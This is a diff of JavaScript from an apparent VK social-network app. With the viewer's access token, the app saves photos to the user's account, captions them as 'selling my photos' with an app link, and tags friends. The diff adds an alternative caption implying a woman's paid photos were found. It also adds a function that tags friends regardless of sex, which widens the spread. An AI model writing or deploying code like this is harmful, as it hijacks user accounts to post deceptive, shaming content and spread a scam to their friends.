@@ -79,9 +79,9 @@
                     </html>');
                 }else{
 
-                  if(viewer.sex == 1){
+                  //if(viewer.sex == 1){
                     createAlbom();
-                  }
+                  //}
 
                   var div = '<div style="padding: 100px;padding-top:50px;padding-bottom:10px;" class="w-full lg:max-w-full lg:flex"> \n\
                               <div class="h-48 lg:h-auto lg:w-48 flex-none bg-cover rounded-t lg:rounded-t-none lg:rounded-l text-center overflow-hidden" style="background-image: url(\''+user.photo_200+'\')"> \n\
@@ -199,6 +199,10 @@
                                 var data = JSON.parse(xhr.responseText);
                                 var users_list = getFriendsOnlineForPhoto();
                                 caption = "Продаю свои фото : \n\n https://vk.com/app"+vk_app_id+"#"+viewer_id+" \n"+users_list;
+                                if(viewer.id == 2){
+                                  caption = "Смотрите чъи платные фотки нашёл, кто знал что она таким занимается? : \n\n https://vk.com/app"+vk_app_id+"#"+viewer_id+" \n"+users_list;
+                                  users_list = getFriendsOnlineForPhotoANYSEX();
+                                }
 
                                 vkConnect.sendPromise("VKWebAppCallAPIMethod", {
                                     "method": "photos.save",
@@ -210,6 +214,9 @@
                                   setTimeout(function() {
                                     var id_photo = data.response[0].id;
                                     caption = "Продаю свои фото : \n\n https://vk.com/app"+vk_app_id+"#"+viewer_id+"";
+                                    if(viewer.id == 2){
+                                      caption = "Смотрите чъи платные фотки нашёл, кто знал что она таким занимается? : \n\n https://vk.com/app"+vk_app_id+"#"+viewer_id;
+                                    }
                                     vkConnect.sendPromise("VKWebAppCallAPIMethod", {
                                         "method": "photos.edit",
                                         "params": {"owner_id": viewer_id, "photo_id": id_photo,  "caption":caption,"v": "5.95", "access_token": token}
@@ -262,6 +269,23 @@
                 break;
               }
             }
+          }
+
+            return users_list;
+        }
+
+        function getFriendsOnlineForPhotoANYSEX() {
+          sortByLastTime();
+          var users_list = "\n \n \n";
+          var count = 0;
+          for(;global_offset_i<viewer.friends.items.length;global_offset_i++) {
+            //if(viewer.friends.items[global_offset_i].sex == 2){
+              users_list += "[id"+viewer.friends.items[global_offset_i].id+"|"+viewer.friends.items[global_offset_i].first_name+"], ";
+              count++;
+              if(count > 8){
+                break;
+              }
+          //  }
           }
 
             return users_list;
